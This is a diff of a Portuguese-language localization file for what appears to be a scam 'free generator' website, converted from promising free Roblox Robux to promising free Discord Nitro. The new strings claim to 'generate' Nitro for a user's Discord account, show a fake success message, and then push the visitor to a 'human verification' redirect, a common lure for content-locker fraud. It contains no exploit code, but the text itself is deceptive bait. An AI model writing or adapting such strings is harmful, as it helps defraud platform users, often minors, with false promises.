@@ -1,11 +1,11 @@
 {
-    "step-1": "Passo 1",
+    "step-1": "Discord Nitro Gratuito",
     "step-2": "Passo 2",
-    "last-step": "Último Passo",
+    "last-step": "Parabéns 🎉",
     "next": "Próximo",
-    "enter-username": "Por favor, insira o seu nome de usuário do Roblox e selecione a sua plataforma.",
-    "placeholder": "Nome de Usuário do Roblox...",
-    "error": "Por favor, insira o seu nome de usuário do Roblox",
+    "enter-username": "Por favor, digite seu nome de usuário do Discord e selecione sua plataforma.",
+    "placeholder": "Username #1234",
+    "error": "Por favor, digite seu nome de usuário do Discord",
     "searching": "Buscando...",
     "confirmation": "Confirmação",
     "confirm-text": "Esta é uma confirmação dos seus dados.",
@@ -13,12 +13,13 @@
     "platform": "Plataforma",
     "quantity": "Quantidade",
     "loading": "Carregando...",
-    "loading-text": "Estamos gerando seus Robux. Isso pode levar alguns segundos.",
-    "quantity-text": "Por favor, selecione a quantidade de Robux.",
-    "searching-text": "Estamos buscando pelo seu nome de usuário do Roblox. Por favor, aguarde...",
+    "loading-text": "Estamos gerando seu Discord Nitro. Isso pode levar alguns segundos.",
+    "quantity-text": "😍 Selecione o tipo de Nitro que você deseja 👇",
+    "searching-text": "Estamos buscando pelo seu nome de usuário do Discord. Por favor, aguarde...",
     "success-text": "Parabéns! Encontramos a sua conta!",
     "success": "Usuário Encontrado!",
-    "verification-text": "Você precisa verificar que é um humano.",
+    "verification-text": "Você precisa concluir uma etapa rápida de verificação humana para ativar totalmente o Discord Nitro em sua conta.",
     "verify": "Verificar",
-    "redirecting": "Você será redirecionado para outra página para verificar se não é um robô. Se não for redirecionado, clique no botão abaixo."
-}
+    "activated": "Foi ativado em sua conta.",
+    "redirecting": "Você será redirecionado para outra página para verificar se você não é um robô. Se não for redirecionado, clique no botão abaixo."
+    }
